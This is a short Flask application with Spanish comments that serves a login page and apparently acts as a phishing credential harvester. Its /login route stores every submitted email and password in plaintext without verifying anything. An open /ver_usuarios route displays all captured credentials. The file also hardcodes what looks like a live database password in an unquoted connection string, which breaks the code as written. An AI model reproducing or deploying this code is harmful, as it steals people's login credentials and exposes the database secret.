from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)

# URL de conexión que Render te dio (REEMPLAZA esto con tus datos reales)
app.config['SQLALCHEMY_DATABASE_URI'] = postgresql://usuarios_db_ziat_user:ODAgP7tkhVP7VTTszFMCfeczhknX3umn@dpg-d1r9clbe5dus73ee86dg-a/usuarios_db_ziat
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Usuario(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    correo = db.Column(db.String(120))
    contraseña = db.Column(db.String(120))

@app.before_first_request
def crear_tabla():
    db.create_all()

@app.route('/')
def index():
    return render_template('login.html')

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    nuevo_usuario = Usuario(correo=email, contraseña=password)
    db.session.add(nuevo_usuario)
    db.session.commit()

    return render_template("exito.html")

@app.route('/ver_usuarios')
def ver_usuarios():
    usuarios = Usuario.query.all()
    resultado = ""
    for u in usuarios:
        resultado += f"<p>ID: {u.id} | Correo: {u.correo} | Contraseña: {u.contraseña}</p>"
    return resultado

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
